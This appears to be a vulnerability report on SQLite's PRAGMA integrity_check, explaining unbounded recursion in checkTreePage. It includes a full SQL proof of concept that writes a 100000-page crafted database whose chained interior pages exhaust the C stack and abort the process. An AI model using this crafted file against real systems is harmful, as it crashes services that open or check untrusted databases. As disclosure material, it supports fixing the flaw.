checkTreePage() is the B-tree walker used by PRAGMA integrity_check. On an interior page it reads the right-child page number from the page header (get4byte at header offset 8) and calls itself, then does the same for each cell’s left-child page number. The only visit guard is checkRef(), which rejects an out-of-range page or a page already marked in aPgRef. That stops cycles; it does not cap the depth of an acyclic chain of distinct pages. A 512-byte-page file whose table root is a spine of nCell=0 interior pages, each with right-child equal to the next page number, therefore adds one C stack frame per page.

The SQL below writes that 100000-page image, ATTACHes it, and runs PRAGMA c.integrity_check. Compilation of that pragma emits OP_IntegrityCk. sqlite3_step → sqlite3Step → sqlite3VdbeExec handles the opcode by calling sqlite3BtreeIntegrityCheck, which invokes checkTreePage on each root. The walk follows the right-child chain until the process aborts.

Reproduction
Requires fileio and series extensions (loaded by default). No extra CLI flags.
PRAGMA auto_vacuum=NONE;
PRAGMA page_size=512;
CREATE TABLE t(x);
SELECT writefile('chain100k.db',
(SELECT substr(data,1,28) || unhex(printf('%08X', 100000)) || substr(data,33) FROM sqlite_dbpage WHERE pgno=1)
|| unhex(replace((
SELECT group_concat(hex(
x'0500000000020000' || unhex(printf('%08X', value+1)) || zeroblob(500)
) ORDER BY value)
FROM generate_series(2, 100000)
), ',', ''))
);
ATTACH 'chain100k.db' AS c;
PRAGMA c.page_count;
PRAGMA c.integrity_check;

writefile builds a 512-byte-page image: page 1 is the just-created header with the database size field set to 100000; pages 2..100000 are interior table pages (flag 0x05, nCell=0, right-child = next page). PRAGMA c.page_count reports 100000, then PRAGMA c.integrity_check walks the spine.

